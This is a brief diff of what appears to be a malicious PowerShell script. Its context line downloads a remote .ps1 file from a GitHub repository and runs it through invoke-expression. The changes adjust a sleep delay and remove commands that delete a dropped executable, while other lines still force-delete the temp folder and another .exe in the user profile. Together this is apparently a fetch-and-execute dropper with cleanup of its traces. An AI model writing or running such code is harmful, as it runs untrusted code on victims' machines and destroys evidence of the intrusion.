@@ -6,7 +6,7 @@ $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expres
 
 
 
-start-sleep 50
+start-sleep 45
 
 
 
@@ -15,9 +15,6 @@ start-sleep 50
 
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-rm "$env:USERPROFILE\bORG2.exe" -r -Force -ErrorAction SilentlyContinue
-rm "$env:USERPROFILE\bORG2.exe" -r -Force -ErrorAction SilentlyContinue
 
 rm "$env:USERPROFILE\d.exe" -r -Force -ErrorAction SilentlyContinue
 
